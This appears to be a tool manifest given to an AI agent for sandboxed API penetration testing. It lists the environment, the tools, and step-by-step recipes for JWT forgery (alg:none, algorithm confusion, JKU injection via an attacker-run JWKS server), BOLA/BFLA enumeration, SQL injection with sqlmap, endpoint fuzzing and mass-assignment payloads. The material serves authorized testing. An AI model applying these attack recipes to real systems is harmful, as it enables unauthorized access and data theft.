# API Security Sandbox — Tool Manifest

You are inside an isolated Linux container with the toolkit below pre-installed.
Use them freely. Internet egress is restricted to the target API and its
oracles — you cannot reach the public internet.

## Environment

- `TARGET_URL`        : base URL of the API under test. ALL HTTP requests go here.
- `ORACLES_URL_EMAIL` : (optional) HTTP API of the test SMTP inbox (e.g. MailHog).
                        Use to read password-reset / OTP / verification emails.
- `WORKSPACE`         : `/workspace`, **read-only** mount of the project source.
                        Use it for static analysis (read, grep, glob).
- `SCRATCH`           : `/sandbox`, writable tmpfs (~200 MB). Drop exploit
                        scripts, JWKS bundles, attacker-controlled servers,
                        captured responses here.
- `host.containers.internal` : reach the host machine (where the target runs).
                              Useful for SSRF / JKU / webhook callbacks where the
                              target needs to call back into a server you start.

## Quick recipes by attack class

### JWT — alg:none acceptance test

    # forge an unsigned token from an existing one
    jwt_tool -X a <token>          # writes a forged token to stdout

    # use it
    curl -sS -H "Authorization: Bearer <forged>" "$TARGET_URL/api/me"

### JWT — RS256 → HS256 algorithm confusion

    # 1. fetch the JWKS
    curl -sS "$TARGET_URL/.well-known/jwks.json" | jq

    # 2. extract pubkey to PEM (jwt_tool will compute it from the JWK)
    # 3. forge: use the public key as the HMAC secret
    jwt_tool -S hs256 -k pub.pem <token>

### JWT — JKU header injection (SSRF + arbitrary-key trust)

    # 1. start an attacker JWKS server inside this container
    mkdir -p /sandbox/jwks && cd /sandbox/jwks
    # ... write your jwks.json with an attacker public key ...
    python3 -m http.server 9999 &

    # 2. forge a JKU-injected token
    jwt_tool -X i -ju "http://host.containers.internal:9999/jwks.json" <token>

### BOLA (Broken Object Level Authorization) enumeration

    for id in $(seq 1 200); do
      curl -sS -H "Authorization: Bearer $TOKEN" \
        "$TARGET_URL/api/users/$id" | jq -c '{id, email, name}' 2>/dev/null
    done

### BFLA (Broken Function Level Authorization) probe

    # try admin endpoints with a non-admin token
    for path in /api/admin/users /api/admin/config /api/internal/health; do
      echo -n "$path -> "
      curl -sS -o /dev/null -w "%{http_code}\n" \
        -H "Authorization: Bearer $TOKEN" "$TARGET_URL$path"
    done

### SQL injection probe

    sqlmap -u "$TARGET_URL/api/search?q=1" \
           -H "Authorization: Bearer $TOKEN" \
           --batch --level 2 --risk 2

### Path / endpoint enumeration

    ffuf -u "$TARGET_URL/FUZZ" \
         -w /usr/share/wordlists/api-objects.txt \
         -mc all -fc 404

    kr scan "$TARGET_URL" -A=apiroutes-210228:20210228

### Parameter discovery

    arjun -u "$TARGET_URL/api/endpoint" -m POST

### Mass assignment / BOPLA

    # send unexpected fields and observe whether they stick
    curl -sS -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -X PATCH "$TARGET_URL/api/users/me" \
         -d '{"name":"x","is_admin":true,"role":"ROLE_ADMIN","balance":999999}'

### Generic Python exploit scaffolding

    cat > /sandbox/exploit.py <<'PY'
    import os, json, httpx, jwt
    target = os.environ['TARGET_URL']
    with httpx.Client(base_url=target, timeout=10, verify=False) as c:
        # ... build setup, attack, evidence ...
        pass
    PY
    python3 /sandbox/exploit.py

### Reading test emails (password reset, OTP)

    # MailHog example — list captured messages
    curl -sS "$ORACLES_URL_EMAIL/api/v2/messages" | jq '.items[].Content.Body'

## Tools available

| Category   | Tools                                                                 |
|------------|-----------------------------------------------------------------------|
| HTTP       | `curl`, `httpie` (`http`/`https`), `wget`, `python httpx/requests`, `node fetch` |
| JWT/crypto | `openssl`, `jwt` (jwt-cli), `jwt_tool`, `pyjwt`, `python-jose`        |
| JSON/XML   | `jq`, `yq`, `xmlstarlet`, `base64`, `xxd`                              |
| Recon      | `ffuf`, `gobuster`, `kr` (kiterunner), `arjun`                         |
| SQL        | `sqlmap`                                                               |
| DB clients | `psql`, `mysql`, `redis-cli`                                           |
| Network    | `dig`, `nslookup`, `nc`, `socat`, `ping`                               |
| General    | `git`, `unzip`, `tar`, `tree`, `vim` (tiny)                            |
| Languages  | `python3` (with httpx/requests/pyjwt/cryptography), `node 18+`         |
| Wordlists  | `/usr/share/wordlists/{api-objects,api-actions,common,raft-small-words}.txt` |

## Filesystem

- `/workspace` — read-only mount of the project source. Use for static
  analysis. Do NOT try to write here.
- `/sandbox`   — writable tmpfs. Your scratch space. Cleaned on container
  restart.
- `/usr/share/wordlists/` — API-focused SecLists subset.

## Notes

- Do not assume internet egress beyond the target. `pip install`, `apt install`,
  `git clone` from the public internet will fail. Everything you need is
  pre-installed.
- For SSRF / JKU / webhook payloads where the target must call back, start a
  server inside this container and tell the target to reach
  `http://host.containers.internal:<port>/`.
- Keep evidence concise. When you confirm a finding, capture the request, the
  response status + body excerpt, and the source location that explains it.
